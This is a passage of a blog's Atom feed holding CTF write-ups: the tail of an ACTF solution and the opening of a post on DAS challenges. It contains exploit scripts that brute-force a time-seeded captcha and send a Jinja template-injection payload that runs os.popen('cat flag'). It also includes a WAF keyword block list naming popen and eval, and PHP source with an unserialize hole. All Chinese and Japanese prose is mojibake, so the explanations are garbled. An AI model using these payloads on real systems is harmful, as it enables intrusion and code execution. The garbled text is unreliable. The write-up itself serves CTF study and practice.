class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Captcha</span>:</span><br><span class="line">    lookup_table: t.<span class="type">List</span>[<span class="built_in">int</span>] = [<span class="built_in">int</span>(i * <span class="number">1.97</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, width: <span class="built_in">int</span> = <span class="number">160</span>, height: <span class="built_in">int</span> = <span class="number">60</span>, key: <span class="built_in">int</span> = <span class="literal">None</span>, length: <span class="built_in">int</span> = <span class="number">4</span>, </span></span><br><span class="line"><span class="params">                 fonts: t.<span class="type">Optional</span>[t.<span class="type">List</span>[<span class="built_in">str</span>]] = <span class="literal">None</span>, font_sizes: t.<span class="type">Optional</span>[t.<span class="type">Tuple</span>[<span class="built_in">int</span>]] = <span class="literal">None</span></span>):</span><br><span class="line">        self._width = width</span><br><span class="line">        self._height = height</span><br><span class="line">        self._length = length</span><br><span class="line">        self._key = (key <span class="keyword">or</span> <span class="built_in">int</span>(time.time())) + random.randint(<span class="number">1</span>,<span class="number">100</span>)</span><br><span class="line">        self._fonts = fonts <span class="keyword">or</span> DEFAULT_FONTS</span><br><span class="line">        self._font_sizes = font_sizes <span class="keyword">or</span> (<span class="number">42</span>, <span class="number">50</span>, <span class="number">56</span>)</span><br><span class="line">        self._truefonts: t.<span class="type">List</span>[FreeTypeFont] = []</span><br><span class="line">        random.seed(self._key)</span><br></pre></td></tr></table></figure><p>å“¦,åŸæ¥æ˜¯æœ‰ç§å­çš„å‘€,é‚£æ²¡äº‹äº†(nmsl).</p><p>è¿™ç§å­æ˜¯å½“å‰æ—¶é—´æˆ³çš„å–è¯æ‹¼æ¥1åˆ°100çš„éšæœºæ•°.</p><p>æ˜¾ç„¶timeæˆ‘ä»¬å¯ä»¥è‡ªå·±æœ¬åœ°ç”Ÿæˆ,1åˆ°100çš„éšæœºæ•°,å‡¹æ¦‚ç‡ä½ ä¸ä¼š?çˆ†ç ´ä»–ä¸ªå‡ ç™¾ä¸Šåƒæ¬¡,æ€»èƒ½ç»ˆå‡ºçš„.</p><p>ç»ˆå‡ºä¸äº†ä¹Ÿåˆ«å¹²äº†,æœºå™¨çˆ†ç ´è¿™ä¹ˆå¤šæ¬¡,1åˆ°100æ€»å¾—ç»ˆå‡ºå§.ğŸ¥µ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">captcha</span>():</span><br><span class="line">    gen = Captcha(<span class="number">200</span>, <span class="number">80</span>)</span><br><span class="line">    buf , captcha_text = gen.generate()</span><br><span class="line"></span><br><span class="line">    session[<span class="string">&#x27;captcha&#x27;</span>] = captcha_text</span><br><span class="line">    <span class="keyword">return</span> buf.getvalue(), <span class="number">200</span>, &#123;</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;image/png&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Length&#x27;</span>: <span class="built_in">str</span>(<span class="built_in">len</span>(buf.getvalue()))</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">    @app.route(<span class="params"><span class="string">&#x27;/vip&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br></pre></td></tr></table></figure><p>ä¸ºæ­¤æˆ‘ä»¬éœ€è¦è®¿é—®captcha,æ¯æ¬¡ä»¥å½“å‰æ—¶é—´æˆ³+éšæœºæ•°ä¸ºç§å­é‡ç½®è¿™ä¸ªå¯¹è±¡,æ‰€ä»¥è¦å…ˆè®¿é—®captch,å†è®¿é—®/vip.</p><p>æµç¨‹æ˜¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">é‡ç½®Captchaå¯¹è±¡,ä»¥å½“å‰æ—¶é—´æˆ³åŠ <span class="number">1</span>è‡³<span class="number">100</span>éšæœºæ•°-&gt;gen.generate()ç”Ÿæˆç¬¬ä¸€æ¬¡éšæœºæ•°-&gt;/vipè·¯ç”±è°ƒç”¨generate_codeéšæœºç”Ÿæˆ</span><br></pre></td></tr></table></figure><p>å› æ­¤,æˆ‘ä»¬ä¹Ÿéœ€è¦å¯¹è½´</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gen = Captcha(<span class="number">200</span>, <span class="number">80</span>, <span class="built_in">int</span>(time.time()) + random.randint(<span class="number">1</span>, <span class="number">100</span>))</span><br><span class="line">  gen.generate()</span><br><span class="line">  requests.get(url1 + <span class="string">&quot;captcha&quot;</span>, headers=headers)</span><br><span class="line">  </span><br></pre></td></tr></table></figure><p>é¦–å…ˆå®Œæˆè¿™äº›æ“ä½œ,ç„¶åè®¿é—®captchaè·¯ç”±,æ­¤æ—¶è½´å¯¹ä¸Šäº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">captcha = generate_code()</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ç”Ÿæˆä¸€æ¬¡generate_code(),å¹¶ä¸”è®¿é—®vip,æ­¤æ—¶æ­¥è°ƒä¸€è‡´äº†,å€˜è‹¥ç§å­ä¸€æ ·,è¿™æ ·çš„è¯·æ±‚ä¸åˆ°1ç§’èƒ½å®Œæˆ,ä¸ä¼šæ”¹å˜æ—¶é—´æˆ³,é‚£ä¹ˆæœ¬åœ°ç”Ÿæˆçš„codeå’Œé¢˜ç›®ä¸€æ ·,å°±èƒ½å¤Ÿæ‹¿åˆ°vipäº†</p><p>ä»Šã¯ğŸ‘´ã®å‹åˆ©ã </p><p>ã“ã‚ŒãŒğŸ‘´ã®æœ€å¾Œã®ã‚¨ã‚¯ã‚¹ãƒãƒ¼ãƒˆï¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> utils.captcha <span class="keyword">import</span> Captcha,generate_code</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url1 =<span class="string">&quot;http://127.0.0.1:15000/&quot;</span></span><br><span class="line">url2 = <span class="string">&quot;http://127.0.0.1:5001/&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    headers=&#123;<span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)&quot;</span>,</span><br><span class="line"></span><br><span class="line">                          <span class="string">&quot;Connection&quot;</span>:<span class="string">&quot;close&quot;</span> ,</span><br><span class="line"><span class="string">&quot;Accept-Encoding&quot;</span>:<span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line"><span class="string">&quot;Accept-Language&quot;</span>:<span class="string">&quot;en&quot;</span>,</span><br><span class="line"><span class="string">&quot;Accept&quot;</span>:<span class="string">&quot;*/*&quot;</span></span><br><span class="line">             &#125;</span><br><span class="line">    <span class="comment"># timekey = int(time.time())</span></span><br><span class="line"></span><br><span class="line">    gen = Captcha(<span class="number">200</span>, <span class="number">80</span>, <span class="built_in">int</span>(time.time()) + random.randint(<span class="number">1</span>, <span class="number">100</span>))</span><br><span class="line">    gen.generate()</span><br><span class="line">    captcha = generate_code()</span><br><span class="line">    requests.get(url1 + <span class="string">&quot;captcha&quot;</span>, headers=headers)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># rawBody = &quot;&#123;\&quot;captcha\&quot;:\&quot;&quot;+captcha+&quot;\&quot;&#125;&quot;</span></span><br><span class="line">    json = &#123;<span class="string">&quot;captcha&quot;</span>: captcha&#125;</span><br><span class="line">    <span class="comment"># print(&quot;json:&quot; + f&quot;&#123;json&#125;&quot;)</span></span><br><span class="line"></span><br><span class="line">    session = requests.session()</span><br><span class="line">    headers2 = &#123;<span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>:</span><br><span class="line">        <span class="string">&quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;en&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>&#125;</span><br><span class="line">    cookies = &#123;<span class="string">&quot;session&quot;</span>: <span class="string">&quot;eyJjYXB0Y2hhIjoidHBUViJ9.ZUDlMw.Iwx2YVR3CqHYbpqySJWOEJX1hac&quot;</span>&#125;</span><br><span class="line">    res = session.post(url1 + <span class="string">&quot;vip&quot;</span>, json=json, headers=headers, cookies=cookies)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(res.headers[<span class="string">&#x27;Set-Cookie&#x27;</span>])</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å› ä¸ºçˆ†ç ´,å‡¹æ¦‚ç‡,å¾ªç¯è·‘å°±è¡Œ</p><p><img src="/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231101112607.png" alt="å¾®ä¿¡æˆªå›¾_20231101112607"></p><p>å“ˆå“ˆå“ˆ!ğŸ‘´ã¯ä¸€ç•ªã®å¤©æ‰ã </p><p>æœ‰waf,é¢ç™½ã„ï¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">rule = [</span><br><span class="line">    [<span class="string">&#x27;\\x&#x27;</span>,<span class="string">&#x27;[&#x27;</span>,<span class="string">&#x27;]&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;getitem&#x27;</span>,<span class="string">&#x27;print&#x27;</span>,<span class="string">&#x27;request&#x27;</span>,<span class="string">&#x27;args&#x27;</span>,<span class="string">&#x27;cookies&#x27;</span>,<span class="string">&#x27;values&#x27;</span>,<span class="string">&#x27;getattribute&#x27;</span>,<span class="string">&#x27;config&#x27;</span>],                   <span class="comment"># rule 1</span></span><br><span class="line">    [<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;]&#x27;</span>,<span class="string">&#x27;getitem&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;print&#x27;</span>,<span class="string">&#x27;config&#x27;</span>,<span class="string">&#x27;args&#x27;</span>,<span class="string">&#x27;values&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;dict&#x27;</span>,<span class="string">&#x27;,&#x27;</span>,<span class="string">&#x27;join&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;set&#x27;</span>],              <span class="comment"># rule 2</span></span><br><span class="line">    [<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;dict&#x27;</span>,<span class="string">&#x27;,&#x27;</span>,<span class="string">&#x27;config&#x27;</span>,<span class="string">&#x27;join&#x27;</span>,<span class="string">&#x27;\\x&#x27;</span>,<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27;[&#x27;</span>,<span class="string">&#x27;]&#x27;</span>,<span class="string">&#x27;attr&#x27;</span>,<span class="string">&#x27;__&#x27;</span>,<span class="string">&#x27;list&#x27;</span>,<span class="string">&#x27;globals&#x27;</span>,<span class="string">&#x27;.&#x27;</span>],                           <span class="comment"># rule 3</span></span><br><span class="line">    [<span class="string">&#x27;[&#x27;</span>,<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27;getitem&#x27;</span>,<span class="string">&#x27;request&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;config&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;dict&#x27;</span>,<span class="string">&#x27;doc&#x27;</span>,<span class="string">&#x27;\\x&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;\&#123;\&#123;&#x27;</span>,<span class="string">&#x27;mro&#x27;</span>],                          <span class="comment"># rule 4</span></span><br><span class="line">    [<span class="string">&#x27;\\x&#x27;</span>,<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27;config&#x27;</span>,<span class="string">&#x27;args&#x27;</span>,<span class="string">&#x27;cookies&#x27;</span>,<span class="string">&#x27;values&#x27;</span>,<span class="string">&#x27;[&#x27;</span>,<span class="string">&#x27;]&#x27;</span>,<span class="string">&#x27;\&#123;\&#123;&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;request&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;attr&#x27;</span>],                          <span class="comment"># rule 5</span></span><br><span class="line">    [<span class="string">&#x27;print&#x27;</span>, <span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;__&#x27;</span>, <span class="string">&#x27;request&#x27;</span>,<span class="string">&#x27;args&#x27;</span>,<span class="string">&#x27;cookies&#x27;</span>,<span class="string">&#x27;values&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;\\x&#x27;</span>,<span class="string">&#x27;getitem&#x27;</span>]                  <span class="comment"># rule 6</span></span><br><span class="line">]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">minic_waf</span>(<span class="params"><span class="built_in">input</span></span>):</span><br><span class="line">    waf_seq = random.sample(<span class="built_in">range</span>(<span class="number">21</span>),<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">for</span> index <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(waf_seq)):</span><br><span class="line">        waf_seq[index] = transfrom(waf_seq[index])</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> singel_waf(<span class="built_in">input</span>, rule[waf_seq[index]]):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure><p>è§„åˆ™æ¯”è¾ƒç‹¬ç‰¹,å…­ä¸ªè§„åˆ™éšæœºç”Ÿæˆä¸‰ä¸ª,å…¶å®åªéœ€æ»¡è¶³ä¸€æ¡å°±è¡Œ,åŒæ ·æ˜¯å‡¹æ¦‚ç‡.</p><p>è¿™ç§sstiéšä¾¿æ‰“,æ‹¿ä¸ªå¯†é’¥å…ˆ.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url1 =<span class="string">&quot;http://127.0.0.1:15000/&quot;</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&quot;story&quot;</span></span><br><span class="line">:</span><br><span class="line"><span class="string">&quot;&#123;&#123;config&#125;&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">cookies = &#123;<span class="string">&quot;session&quot;</span>:<span class="string">&quot;eyJ2aXAiOnRydWV9.ZUHlMg.eUH9ICmOx6JUujFsb8MxYu4QkOE&quot;</span>&#125;</span><br><span class="line">session = requests.session()</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    res = requests.post(url=url1+<span class="string">&quot;write&quot;</span>,json=data,cookies=cookies)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        cookie = res.headers[<span class="string">&#x27;Set-Cookie&#x27;</span>].split(<span class="string">&quot;=&quot;</span>)[<span class="number">1</span>].split(<span class="string">&quot;;&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(cookie)</span><br><span class="line">        res2 = requests.get(url=url1+<span class="string">&quot;story&quot;</span>,cookies = &#123;<span class="string">&quot;session&quot;</span>:cookie&#125;)</span><br><span class="line">        <span class="built_in">print</span>(res2.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>è¿™ç§çˆ†ç ´å¯¹ğŸ‘´æ¥è¯´è¿˜æ˜¯å¤ªç®€å•äº†,éšéšä¾¿ä¾¿å†™ä¸ªè„šæœ¬å†²äº†</p><p>æ‹¿åˆ°å¯†é’¥èƒ½å¹²å¾ˆå¤šäº‹äº†,</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;6e409b39-94e4-4557-9549-961bafdebf98&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/story&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">session_get</span>():</span><br><span class="line">    session[<span class="string">&#x27;story&#x27;</span>] = <span class="string">&quot;&#123;&#123;url_for.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&#125;&#125;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> session[<span class="string">&#x27;story&#x27;</span>] </span><br></pre></td></tr></table></figure><p>ğŸ‘´ä¸æƒ³è·‘flasksessionè„šæœ¬,å¤ªæ‡’äº†,è´¹åŠ²,ğŸ˜¡,ğŸ‘´å°±ç›´æ¥åœ¨è·¯ç”±é‡Œé¢è®¾ç½®äº†.</p><p><img src="/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231101135012.png" alt="å¾®ä¿¡æˆªå›¾_20231101135012"></p><p>eeeeeeeeez!</p><p>å…¶å®ƒç®€å•çš„é¢˜,ğŸ‘´ä¸æƒ³åŠ¨äº†.</p><p>ç»ˆäºğŸ›å®Œäº†,å¥½ğŸ“•ğŸ‘šå•Š</p><p>ã“ã‚ŒãŒå›ã®çŸ¥ã‚‰ãªã„ç‰©èª</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://1llustrious.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="https://1llustrious.github.io/tags/WP/"/>
    
    <category term="å¤ç°" scheme="https://1llustrious.github.io/tags/%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>å…³äºDASçš„å°è®°</title>
    <link href="https://1llustrious.github.io/2023/12/01/%E5%85%B3%E4%BA%8EDAS%E7%9A%84%E5%B0%8F%E8%AE%B0/"/>
    <id>https://1llustrious.github.io/2023/12/01/%E5%85%B3%E4%BA%8EDAS%E7%9A%84%E5%B0%8F%E8%AE%B0/</id>
    <published>2023-12-01T01:10:33.000Z</published>
    <updated>2023-12-15T06:20:05.219Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><!-- toc --><ul><li><a href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2">å†™åœ¨å‰é¢</a></li><li><a href="#single_php">Single_php</a><ul><li><a href="#opcache">Opcache</a></li><li><a href="#soapclient">SoapClient</a></li></ul></li><li><a href="#ezfastjson">Ezfastjson</a><ul><li><a href="#nomap">Nomap</a><ul><li><a href="#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE">å‚è€ƒæ–‡çŒ®ğŸ˜Š</a></li><li><a href="#%E8%B0%83%E7%94%A8%E9%93%BE">è°ƒç”¨é“¾</a></li><li><a href="#writeobject">writeObject</a></li></ul></li><li><a href="#%E5%86%85%E5%AD%98%E9%A9%AC">å†…å­˜é©¬</a></li><li><a href="#kali_tips">kali_tips</a></li></ul></li><li><a href="#ezpenetration">EzPenetration</a><ul><li><a href="#%E6%89%ABwp">æ‰«wp</a></li></ul></li></ul><!-- tocstop --><h1 id="å†™åœ¨å‰é¢"><span id="å†™åœ¨å‰é¢"> å†™åœ¨å‰é¢</span></h1><p>è¿™æ¬¡DASæ˜¯æˆ‘ä»¬0psu3æˆå‘˜å‡ºçš„é¢˜,è¿™ä¹Ÿæ˜¯æˆ‘ç¬¬ä¸€æ¬¡å‡ºé¢˜ç»™å„ä½å¸ˆå‚…åš,æœ‰å‡ºå¾—ä¸å¥½çš„åœ°æ–¹è¿˜å¸Œæœ›å¸ˆå‚…ä»¬è½»ç‚¹å–·ğŸ˜­ğŸ˜­ğŸ˜­.</p><p>æˆ‘å‡ºçš„æ˜¯<code>Single_php</code>,ä¸€å¼€å§‹åªæ˜¯æƒ³å‡ºä¸€ä¸ªOpcacheæ‰©å±•æ¼æ´çš„,é€šè¿‡æ–‡ä»¶ä¸Šä¼ åˆ°/tmpç›®å½•ä¸‹è¦†ç›–çš„,åæ¥åœ¨æ€è€ƒ,æ€ä¹ˆç»™å¸ˆå‚…ä»¬phpinfo,äºæ˜¯æˆ‘å°±æƒ³èµ·äº†å¯ä»¥é€šè¿‡æ•°ç»„çš„å½¢å¼è°ƒç”¨ä»»æ„æ— å‚æ–¹æ³•,äºæ˜¯æˆ‘åˆæ”¹äº†ä¸€ä¸‹,æ‰“ç®—é…å¥—æ•´ä¸ªSSRF,ä¼—æ‰€å‘¨çŸ¥,è°ƒç”¨SoapClientä¸å­˜åœ¨çš„æ–¹æ³•,å°±å¯ä»¥æ‰“SSRF,é€šè¿‡UAè¿›è¡ŒæŠ¥æ–‡ä¼ªé€ ,è€Œä¸”åˆæ¶‰åŠåˆ°æ–‡ä»¶ä¸Šä¼ ,å‹ç¼©åŒ…çš„æ•°æ®åœ¨æŠ¥æ–‡é‡Œé¢ä¸€èˆ¬éƒ½æ˜¯ä¹±ç ,ä¼ªé€ èµ·æ¥æ¯”è¾ƒéº»çƒ¦,äºæ˜¯æˆ‘é€šè¿‡pythonå‘åŒ…,è·å–body,äºæ˜¯å°±æœ‰äº†è¿™é“é¢˜çš„æ‰“æ³•.</p><p>å¦å¤–æœ¬æ–‡ä¸­,æˆ‘è¿˜ä¼šæ•´ä¸€ä¸ªEzfastjsonçš„å†…å®¹,åˆ†äº«ä¸€äº›å¾®ä¸è¶³é“çš„å°çŸ¥è¯†,è¿˜è¯·å¸ˆå‚…ä»¬æ‰‹ä¸‹ç•™æƒ….</p><h1 id="single_php"><span id="single_php"> Single_php</span></h1><p>è¿™é“é¢˜çš„æœ€ç»ˆç»“æœæ„æƒ³ä¸åˆ°,æˆ‘é¢„è®¡éš¾åº¦ä¸­ç­‰,æƒ³ç€å‡ ä¸ªç®€å•çš„çŸ¥è¯†ç‚¹å‡‘ä¸€å—å¯èƒ½ä¼šè¢«æ‰“çƒ‚,ä½†å®Œå…¨å‡ºä¹æ„æ–™.</p><p>è¯¥é¢˜ç›®å«Single_phpå®Œå…¨æ˜¯æˆ‘å¤¹å¸¦ç§è´§,å¤šå°‘æœ‰ç‚¹ä¸ªäººæ©æ€¨äº†ğŸ˜…</p><p>?LuckyE=highlight_fileè·å¾—æºç </p><p><img src="/2023/12/01/%E5%85%B3%E4%BA%8EDAS%E7%9A%84%E5%B0%8F%E8%AE%B0/e4f1299e-3114-454f-933d-4d56d4e168ae.png" alt="e4f1299e-3114-454f-933d-4d56d4e168ae"></p><p>ä¼ä¸š,æˆ‘çš„ä¼ä¸šæ–¯å“ˆæ–¯å“ˆğŸ¥µğŸ¥µğŸ¥µğŸ¥µ</p><p>ä½†æ˜¯,æˆ‘å·²ç»å•èº«19å¹´äº†,è€Œèº«è¾¹çš„äººéƒ½å·²ç»è„±å•äº†~~,æˆ‘è¦å¤ä»‡!!!(bushi)~~ å°¤å…¶æ˜¯æŸSå¼€å¤´çš„å¸ˆå‚….</p><p>è¿™å°±èƒ½çœ‹åˆ°æºç äº†,æ˜¯ä¸æ˜¯å¾ˆç®€å•ğŸ˜ŠğŸ˜ŠğŸ˜Š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">siroha</span></span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$koi</span>;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;koi[<span class="string">&#x27;zhanjiangdiyishenqing&#x27;</span>]();</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="variable">$kanozyo</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;LuckyE&#x27;</span>](<span class="keyword">__FILE__</span>);</span><br><span class="line"> <span class="title function_ invoke__">var_dump</span>(<span class="variable">$kanozyo</span>);</span><br><span class="line"> <span class="variable">$suki</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;suki&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>ä½ çœ‹,æºç å°±è¿™ä¹ˆç‚¹å†…å®¹.</p><p>å·²ç»èƒ½å¯¹å½“å‰æ–‡ä»¶è¿›è¡Œæ“ä½œ,ä¸è¿‡ä¸ºäº†é˜²æ­¢å¸ˆå‚…ä»¬ä¹±æ,é˜²æ­¢ä¸€äº›å¥‡å¥‡æ€ªæ€ªéé¢„æœŸ,æˆ‘å°†å½“å‰ç›®å½•è®¾ç½®ä¸ºåªè¯»äº†ğŸ¤£,çœŸä¸æ˜¯æˆ‘æ‡’.</p><p>ä¿¡æ¯æœé›†æç¤ºè¿˜æœ‰ä¸ªæ–‡ä»¶siranai.php(å¸Œè…Šå¥¶å“Ÿ)</p><p><img src="/2023/12/01/%E5%85%B3%E4%BA%8EDAS%E7%9A%84%E5%B0%8F%E8%AE%B0/image-20231201140448843.png" alt="image-20231201140448843"></p><p>è¿™å¯æ˜¯é€šè¿‡SSRFè§¦å‘æ–‡ä»¶ä¸Šä¼ 